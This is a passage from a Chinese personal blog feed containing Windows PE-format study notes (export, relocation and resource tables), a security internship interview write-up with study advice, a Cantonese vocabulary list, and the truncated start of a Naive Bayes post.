href="#5-4-2-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="5.4.2 IMAGE_EXPORT_DIRECTORY"></a>5.4.2 IMAGE_EXPORT_DIRECTORY</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件生成时间</span></span><br><span class="line">    WORD    MajorVersion;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    WORD    MinorVersion;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">//模块名字</span></span><br><span class="line">    DWORD   Base;<span class="comment">//基数，加上序数就是函数地址数组的索引值</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">//所有导出函数的数量</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">//按名字导出函数的数量</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">//指向输出函数地址的RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">//指向输出函数名字的RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">//指向输出函数序号的RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>重要字段说明如下：</p><ul><li><p>Name：一个RVA 值，指向一个定义了模块名称的字符串。如即使Kernel32.dll 文件被改名为”Ker.dll”，仍然可以从这个字符串中的值得知其在编译时的文件名是”Kernel32.dll”。</p></li><li><p>NumberOfFunctions：文件中包含的导出函数的总数。</p></li><li><p>NumberOfNames：被定义函数名称的导出函数的总数。显然只有这个数量的函数既可以用函数名方式导出，也可以用序号方式导出。剩下的<code>NumberOfFunctions</code>减去<code>NumberOfNames</code>数量的函数只能用序号方式导出。该字段的值只会小于或者等于<code>NumberOfFunctions</code>字段的值，如果这个值是0，表示所有的函数都是以序号方式导出的。</p></li><li><p>AddressOfFunctions：一个RVA 值，指向包含全部导出函数入口地址的双字数组。数组中的每一项是一个RVA 值，数组的项数等于<code>NumberOfFunctions</code>字段的值。</p></li><li><p>Base：导出函数序号的起始值，将<code>AddressOfFunctions</code>字段指向的入口地址表的索引号加上这个起始值就是对应函数的导出序号。</p><p>假如Base 字段的值为x，那么入口地址表指定的第1个导出函数的序号就是x；第2个导出函数的序号就是x＋1。总之，一个导出函数的导出序号等于Base 字段的值加上其在入口地址表中的位置索引值。</p></li><li><p>AddressOfNames 和 AddressOfNameOrdinals：均为RVA 值。前者指向函数名字符串地址表。这个地址表是一个双字数组，数组中的每一项指向一个函数名称字符串的RVA。数组的项数等于<code>NumberOfNames</code>字段的值，所有有名称的导出函数的名称字符串都定义在这个表中；后者指向另一个word 类型的数组（注意不是双字数组）。数组项目与文件名地址表中的项目一一对应，项目值代表函数入口地址表的索引，这样函数名称与函数入口地址关联起来。</p><p>假如函数名称字符串地址表的第n项指向一个字符串“MyFunction”，那么可以去查找<code>AddressOfNameOrdinals</code>指向的数组的第n项，假如第n项中存放的值是x，则表示<code>AddressOfFunctions</code>字段描述的地址表中的第x项函数入口地址对应的名称就是“MyFunction”。</p></li></ul><img src="/posts/4dec66bb/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%9B%B8%E4%BA%92%E5%85%B3%E7%B3%BB.png" class="" title="导出表相互关系"><h3 id="※5-4-3-查找函数入口地址"><a href="#※5-4-3-查找函数入口地址" class="headerlink" title="※5.4.3 查找函数入口地址"></a>※5.4.3 查找函数入口地址</h3><h4 id="5-4-3-1-从序号查找函数入口地址"><a href="#5-4-3-1-从序号查找函数入口地址" class="headerlink" title="5.4.3.1 从序号查找函数入口地址"></a>5.4.3.1 从序号查找函数入口地址</h4><p>Windows 装载器的工作步骤如下：</p><ol><li>定位到PE 文件头</li><li>从PE 文件头中的<code>IMAGE_OPTIONAL_HEADER32</code>结构中取出数据目录表，并从第一个数据目录中得到导出表的RVA</li><li>从导出表的<code>Base</code>字段得到起始序号</li><li>将需要查找的导出序号减去起始序号，得到函数在入口地址表中的索引</li><li>检测索引值是否大于导出表的<code>NumberOfFunctions</code>字段的值，如果大于后者的话，说明输入的序号是无效的</li><li>用这个索引值在<code>AddressOfFunctions</code>字段指向的导出函数入口地址表中取出相应的项目，这就是函数入口地址的RVA 值，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址</li></ol><h4 id="5-4-3-2-从函数名称查找入口地址"><a href="#5-4-3-2-从函数名称查找入口地址" class="headerlink" title="5.4.3.2 从函数名称查找入口地址"></a>5.4.3.2 从函数名称查找入口地址</h4><p>Windows 装载器的工作步骤如下：</p><ol><li>最初的步骤是一样的，那就是首先得到导出表的地址</li><li>从导出表的<code>NumberOfNames</code>字段得到已命名函数的总数，并以这个数字作为循环的次数来构造一个循环</li><li>从<code>AddressOfNames</code>字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与要查找的函数名相比较，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数</li><li>如果某一项定义的函数名与要查找的函数名符合，那么记下这个函数名在字符串地址表中的索引值，然后在<code>AddressOfNamesOrdinals</code>指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x</li><li>最后，以 x 值作为索引值，在<code>AddressOfFunctions</code>字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址</li></ol><p>一般情况下病毒程序就是通过函数名称查找入口地址的，因为病毒程序作为一段额外的代码被附加到可执行文件中的，如果病毒代码中用到某些 API 的话，这些 API 的地址不可能在宿主文件的导出表中为病毒代码准备好。因此只能通过在内存中动态查找的方法来实现获取 API 的地址。</p><p><a href="https://www.bilibili.com/video/BV1us411P7nL?p=10">找到PE文件中输出表的导出函数地址 空降23:05</a></p><h2 id="5-5-基址重定位"><a href="#5-5-基址重定位" class="headerlink" title="5.5 基址重定位"></a>5.5 基址重定位</h2><p>链接器生成一个PE文件时，它会假设程序被装入时使用的默认<code>ImageBase</code>基地址（VC默认EXE基地址00400000h，DLL基地址10000000h），并且会把代码中所有指令中用到的地址都使用默认的基地址（例如程序代码中 push 10001000，就是把10000000h当做了基地址，把push 10001000写入到文件中）。如果一个EXE程序中一个DLL装载时的地址与其它DLL地址发生冲突（因为Windows程序是虚拟地址空间，EXE一般不会有地址冲突，加载DLL时可能会有地址冲突），就需要修改代码中的地址，这时就需要进行基址重定位。</p><p>凡是涉及到直接寻址的指令都需要进行重定位处理，如push 10001000，call 10002000等。假设重定位后的基地址由原来的10000000h变为20000000h，那么push 10001000应该改成push 20001000。</p><p>所以重定位的算法可以总结为：</p><p>重定位后的地址 = 直接寻址指令中的双字地址 + (模块实际装入地址 - 模块建议装入地址)</p><p>在PE文件中，基址重定位表一般放在一个单独的<code>.reloc</code>区，可以通过<code>IMAGE_OPTIONAL_HEADER</code>中的<code>DataDirectory[5]</code>查看基址重定位表的RVA。PE文件的重定位表中保存的就是文件中所有需要进行重定位修正的代码的地址。基址重定位表是由一个个<code>IMAGE_BASE_RELOCATION</code>结构构成的。</p><h3 id="5-5-1-IMAGE-BASE-RELOCATION"><a href="#5-5-1-IMAGE-BASE-RELOCATION" class="headerlink" title="5.5.1 IMAGE_BASE_RELOCATION"></a>5.5.1 IMAGE_BASE_RELOCATION</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line">    WORD    TypeOffset[];</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION, * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><ul><li>VirtualAddress：重定位数据开始的RVA地址。</li><li>SizeOfBlock：重定位块的长度。</li><li>TypeOffset[]：一个数组，它的元素个数就是$\frac {SizeOfBlock-8}{2}$，每一个元素占用两个字节(16位)，其中高4位表示重定位类型，低12位表示重定位地址。它与<code>VirtualAddress</code>相加即是指向PE映像中需要修改的地址数据的指针。</li></ul><h2 id="5-6-资源表"><a href="#5-6-资源表" class="headerlink" title="5.6 资源表"></a>5.6 资源表</h2><p>Windows程序的各种界面称为资源，包括加速键、位图、光标、对话框、图标、菜单、串表、工具栏和版本信息等。资源是PE文件中非常重要的部分，几乎所有的PE文件中都包含着资源，与导入表和导出表相比，资源的组织方式要复杂得多。</p><img src="/posts/4dec66bb/%E8%B5%84%E6%BA%90%E6%A0%91%E5%BD%A2%E7%BB%93%E6%9E%84.png" class="" title="资源的树形结构"><p>资源有很多种类型，每种类型的资源中可能存在多个资源项，这些资源项用不同的ID或名称来区分，采取类似于磁盘目录结构的方式保存。从上图可以看到，PE文件中的资源是按照 资源类型 -&gt; 资源ID -&gt; 资源代码页 的3层树型目录结构来组织资源的，通过层层索引才能够进入相应的子目录找到正确的资源。</p><h3 id="5-6-1-资源目录结构"><a href="#5-6-1-资源目录结构" class="headerlink" title="5.6.1 资源目录结构"></a>5.6.1 资源目录结构</h3><p>数据目录表中的<code>IMAGE_DIRECTORY_ENTRY_RESOURCE</code>条目(第三项)包含资源的RVA和大小。资源目录结构中的每一个结点都是由<code>IMAGE_RESOURCE_DIRECTORY</code>结构和紧跟其后的数个<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>结构组成的。</p><img src="/posts/4dec66bb/%E8%B5%84%E6%BA%90%E7%9B%AE%E5%BD%95.png" class="" title="资源目录结构"><h3 id="5-6-2-IMAGE-RESOURCE-DIRECTORY"><a href="#5-6-2-IMAGE-RESOURCE-DIRECTORY" class="headerlink" title="5.6.2 IMAGE_RESOURCE_DIRECTORY"></a>5.6.2 IMAGE_RESOURCE_DIRECTORY</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    WORD    NumberOfNamedEntries;   <span class="comment">// 用字符串作为资源标识的条目个数</span></span><br><span class="line">    WORD    NumberOfIdEntries;      <span class="comment">// 用数字ID作为资源标识的条目个数</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure><p>唯一要注意的就是<code>NameberOfNamedEntries</code>和<code>NumberOfIdEntries</code>，它们说明了本目录中目录项的数量，两者加起来就是本目录中的目录项总和，也就是后边跟着的<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>数目。</p><h3 id="5-6-3-IMAGE-RESOURCE-DIRECTORY-ENTRY"><a href="#5-6-3-IMAGE-RESOURCE-DIRECTORY-ENTRY" class="headerlink" title="5.6.3 IMAGE_RESOURCE_DIRECTORY_ENTRY"></a>5.6.3 IMAGE_RESOURCE_DIRECTORY_ENTRY</h3><p><code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>紧跟在资源目录结构后，此结构长度为 8 个字节，包含 2 个字段。该结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;<span class="comment">//资源名偏移</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;<span class="comment">//资源名为字符串</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">        DWORD   Name;<span class="comment">//资源/语言类型</span></span><br><span class="line">        WORD    Id;<span class="comment">//资源数字ID</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;    <span class="comment">// 资源名称</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;<span class="comment">//数据偏移地址</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;<span class="comment">//子目录偏移地址</span></span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;<span class="comment">//数据为目录</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME2;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;   <span class="comment">// 资源位置</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><p>这个结构体在每一层中都是以结构体数组的方式存在，但在每一层的含义都不同：</p><ul><li>第一层，每个元素代表一种资源</li><li>第二层，每个元素代表一个资源</li><li>第三层，每个元素代表一个资源的位置</li></ul><h4 id="5-6-3-1-第一个联合体"><a href="#5-6-3-1-第一个联合体" class="headerlink" title="5.6.3.1 第一个联合体"></a>5.6.3.1 第一个联合体</h4><ul><li>如果最高位为0，也就是<code>NameIsString</code>为0，此时4字节代表资源类型，也就是ID起作用</li></ul><div class="table-container"><table><thead><tr><th>值</th><th>资源类型</th><th>值</th><th>资源类型</th></tr></thead><tbody><tr><td>0x01</td><td>鼠标指针</td><td>0x08</td><td>字体</td></tr><tr><td>0x02</td><td>位图</td><td>0x09</td><td>快捷键</td></tr><tr><td>0x03</td><td>图标</td><td>0x0A</td><td>非格式化资源</td></tr><tr><td>0x04</td><td>菜单</td><td>0x0B</td><td>消息列表</td></tr><tr><td>0x05</td><td>对话框</td><td>0x0C</td><td>鼠标指针组</td></tr><tr><td>0x06</td><td>字符串列表</td><td>0x0E</td><td>图标组</td></tr><tr><td>0x07</td><td>字体目录</td><td>0x0F</td><td>版本信息</td></tr></tbody></table></div><ul><li><p>如果最高位为1，也就是<code>NameIsString</code>为1，这是<code>NameOffset</code>指向保存字符串的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span></span><br><span class="line">    WORD    Length;<span class="comment">//字符串长度</span></span><br><span class="line">    WCHAR   NameString[<span class="number">1</span>];<span class="comment">//UNICODE字符串</span></span><br><span class="line">&#125;IMAGE_RESOURCE_DIR_STRING_U,*PIMAGE_RESOURCE_DIR_STRING_U;</span><br></pre></td></tr></table></figure></li></ul><p>第二个元素<code>NameString</code>为字符串起始地址，长度为<code>Length</code>，这个串不是以0结尾。</p><h4 id="5-6-3-2-第二个联合体"><a href="#5-6-3-2-第二个联合体" class="headerlink" title="5.6.3.2 第二个联合体"></a>5.6.3.2 第二个联合体</h4><ul><li>如果最高位为1，也就是<code>DataIsDirectory</code>为1，代表<code>OffsetToDirectory</code>指向的地方是一个目录。通常，第一层和第二层，这个值都是1。</li><li>如果最高位为0，也就是<code>DataIsDirectory</code>为0，代表<code>OffsetToDirectory</code>指向的地方是一个数据。通常，第三层，这个值为0。</li></ul><h3 id="5-6-4-IMAGE-RESOURCE-DATA-ENTRY"><a href="#5-6-4-IMAGE-RESOURCE-DATA-ENTRY" class="headerlink" title="5.6.4 IMAGE_RESOURCE_DATA_ENTRY"></a>5.6.4 IMAGE_RESOURCE_DATA_ENTRY</h3><p>这个结构体是第三层指向的，最终资源的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData;   <span class="comment">// 资源偏移，RVA</span></span><br><span class="line">    DWORD   Size;           <span class="comment">// 资源大小</span></span><br><span class="line">    DWORD   CodePage;       <span class="comment">// 资源页属性</span></span><br><span class="line">    DWORD   Reserved;</span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure><img src="/posts/4dec66bb/PE%E7%BB%93%E6%9E%84.png" class="" title="PE结构总结">]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>奇安信一面凉经</title>
    <link href="http://example.com/posts/61cb3b01.html"/>
    <id>http://example.com/posts/61cb3b01.html</id>
    <published>2022-05-16T00:03:56.760Z</published>
    <updated>2022-05-17T06:26:35.851Z</updated>
    
    <content type="html"><![CDATA[<p>我第一次面试…好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~</p><p>废话结束，进入正题。</p><span id="more"></span><p>1.首先自我介绍吧，主要是你在大学里边做了一些什么与安全相关的项目，比较拿得出手的一些项目，其次是你自己的一个技能点，你最擅长做什么事情。</p><p>2.我看你投的是安全研究员软件方向，你期望的工作内容是什么？</p><p>3.你有没有分析过Windows平台下的样本、病毒？</p><p>4.相对虚拟地址(RVA)和文件偏移地址(FOA)间的转换。</p><p><a href="https://bbs.pediy.com/thread-221766.htm">https://bbs.pediy.com/thread-221766.htm</a></p><p>5.代码段具有可读可写可执行中的哪些权限？</p><p>6.IAT(导入地址表)是用来干什么的，导入的具体流程。</p><p>7.在shellcode中动态定位API的过程。</p><p>8.Windows平台病毒样本的类型。</p><p><a href="https://www.docin.com/p-2495525891.html">https://www.docin.com/p-2495525891.html</a></p><p>这个好牛，如果写得不错买它！ <a href="https://blog.csdn.net/eastmount/category_9193519.html">https://blog.csdn.net/eastmount/category_9193519.html</a> </p><p>9.常见的函数调用约定类型有哪些？</p><p><a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin">https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin</a></p><p>10.函数的返回地址保存在什么位置？</p><p>EBP+4</p><p>11.异常处理机制的具体工作流程。</p><p><a href="https://blog.csdn.net/TCP_321/article/details/121784949">https://blog.csdn.net/TCP_321/article/details/121784949</a></p><p>12.WinDBG要会用。</p><p>13.Windows平台下的hook和注入技术。hook类型有哪些？注入方法有哪些？</p><p>可以跟着这位博主学学 <a href="https://www.cnblogs.com/SunsetR/">https://www.cnblogs.com/SunsetR/</a></p><p>14.您有没有分析过漏洞？(漏洞会比样本更有难度。)</p><p>15.dll劫持了解吗？</p><p>16.有没有去复现过一些漏洞？</p><p><strong>反问环节</strong></p><p>1.安全研究员暑期实习有4个方向，会被分配到想去的那个方向吗？</p><p>答：面试官的组包括漏洞二进制安全、软件安全、网络安全。(如果进了他的组就是做这些了)</p><p>2.在实习期间的主要工作内容？</p><p>答：有三个方向：Web、Windows、Linux。每一个方向都有相应的安全产品的技术研究。比如Windows平台，有360、天勤、火绒，我们的组是基础攻防组，主要去研究这些产品的防护原理，也就是做攻击和防御研究的；其次做漏洞分析，比如这个月微软补丁日出来了，会去研究一下哪些危害比较高的漏洞，写POC或根据已有的POC去把它的漏洞利用(exp)写出来；还有安全技术的研究，比如说exp写出来了，但是只是完成了exp，只是拿到了权限，它并不能做一些真正的恶意操作，这个时候就需要做攻击技术的人去写shellcode，将shellcode加入到exp中，两者结合做一些攻击利用。还有漏洞挖掘的工作，针对Windows平台和Linux平台的浏览器和文档类软件，比如pdf、office软件。</p><p>面：在这次面试中做了哪些准备？</p><p>安全研究岗更偏向于实际的一些东西，动手实践的东西，你能做什么，做了一些什么项目，而不是理论。操作系统、计算机网络更偏向于开发岗。</p><p>我：怎么去学习？</p><p>答：对于Windows平台，最基础的，CTF是一个很好的跳板，更好的练习方法就是实际去做一个样本的分析。Windows平台不管是做漏洞还是做威胁情报还是病毒分析，最核心的一点的就是，他们所有都是PE文件，所以要对PE文件结构非常熟悉，其次是Windows平台下的hook和注入技术，不管是安全软件还是病毒，都会大量使用到。更高阶的，做漏洞分析。比如office的漏洞、浏览器的漏洞、提权的漏洞。通过做病毒分析，可以把上面基础的东西用到，那这些基础知识自然就知道了。hook技术如何检测虚拟机、反调试、脱壳、内存解密、执行。特别是那种APT病毒，挖矿、勒索，分析很多这种，那些知识你都可以掌握得到。所以如果你想从Windows平台去入门，一定要从实战去做，边操作边学习。通过分析大量病毒样本，对于病毒的加解密、遍历文件，同时也要去考虑安全软件如何去防护这些病毒的。当你对Windows平台的基础比较了解的时候，那么你就可以开始做一些更高阶的，比如说漏洞利用的研究，uaf注入类型的漏洞、栈溢出、堆溢出等等。比较流行的勒索，有报告的，可以参考报告去看，一步一步自己手动分析出来。每家安全公司都有威胁安全情报中心，比如奇安信、360、深信服，可以去看他们的报告，自己去做分析。</p><p>奇安信安全岗主要职责：漏洞研究、APT样本研究、攻击利用手法研究、安全产品漏洞研究</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我第一次面试…好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~&lt;/p&gt;
&lt;p&gt;废话结束，进入正题。&lt;/p&gt;</summary>
    
    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>粤语正字</title>
    <link href="http://example.com/posts/f9ece6c7.html"/>
    <id>http://example.com/posts/f9ece6c7.html</id>
    <published>2022-05-13T04:47:28.320Z</published>
    <updated>2022-05-15T13:44:05.257Z</updated>
    
    <content type="html"><![CDATA[<p>让我看看是哪个广东人不会写粤语的？！是我。</p><span id="more"></span><p>攞(luo)：拿。</p><p>抌(dan)：抌心口、抌章、抌垃圾。</p><p>掟(ding/zheng)：掟手榴弹、掟石仔。</p><p>𢫕：甩。𢫕水。</p><p>㨃(dui)：捅。㨃佢。</p><p>打㰇(jian)：插队。</p><p>唔𠸎(na)耕：冇𠸎㨢，两者之间没有关系。</p><p>无𠸎𠸎：无端端，无缘无故。</p><p>冇(厘)搭霎：做事粗心大意，马马虎虎。</p><p>发𤷪𤺧：脾气变得暴躁。</p><p>发吽(ou)哣(tou)：发呆。</p><p>发烂鲊(zha)：蛮横，不讲理。</p><p>黐(chi)线：原意指电话线路黐在一起，不知道对方在说什么。</p><p>君真：做事认真。</p><p>心抱：媳妇。</p><p>巢皮：洗澡洗很久手指皮都皱了。</p><p>猜呈寻：石头剪刀布。</p><p>掬气：生气。</p><p>便：出便，外便，呢便，嗰(ge)便。</p><p>禁：经受住；耐。好禁睇，好禁计。</p><p>论尽：做事常出毛病，麻烦，累赘。</p><p>咪摸：做事慢，磨蹭。</p><p>吞pork：偷懒。</p><p>cut电话：挂电话。</p><p>card片：卡片。</p><p>搭lift：搭电梯。</p><p>买fare：买票。</p><p>shirt衫：衬衫。</p><p>laine衫：毛衣。laine(法语，羊毛的意思)。</p><p>平靓正：又好又便宜。</p><p>𢫏：𢫏被，𢫏盖，兜巴𢫏你。(用手掌从上往下打)</p><p>升：兜巴升你。(用力向上猛击)</p><p>揿(qin)：按，摁。揿钉，揿掣(che)，揿住佢。</p><p>特登：故意，特意。</p><p>求其：随便。</p><p>是但：随便。</p><p>流嘢：朱义盛(以前广州的一家金铺，专卖仿金首饰)。质量差，虚假的。</p><p>咧啡：吊儿郎当，衣冠不整，不修边幅。</p><p>孤寒：吝啬。风吹皇帝裤浪——孤寒。</p><p>傑(jie)：稠，浓。粥好傑。傑嘢：重大事件。</p><p>架罉(cheng)：工具。</p><p>搦(nuo)：搦部手机过嚟。</p><p>擗(pi)：扔，丢弃。擗嘢。擗炮唔捞。</p><p>景轰：蛊惑。肯定有景轰。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;让我看看是哪个广东人不会写粤语的？！是我。&lt;/p&gt;</summary>
    
    
    
    <category term="长知识了" scheme="http://example.com/categories/%E9%95%BF%E7%9F%A5%E8%AF%86%E4%BA%86/"/>
    
    
  </entry>
  
  <entry>
    <title>朴素贝叶斯算法</title>
    <link href="http://example.com/posts/ea9b7d09.html"/>
    <id>http://example.com/posts/ea9b7d09.html</id>
    <published>2022-05-13T04:32:17.026Z</published>
    <updated>2022-05-13T05:25:57.800Z</updated>
    
    <content type="html"><![CDATA[<p>做的时候很痛苦，但完全是自己写出来的算法真的很有成就感呜呜呜！感谢简博士清晰易懂的例题讲解，让我懂得它的原理。</p><p>经过这个算法我也清楚了Python列表与字典该在哪种情况下使用哪个，非常不错~</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 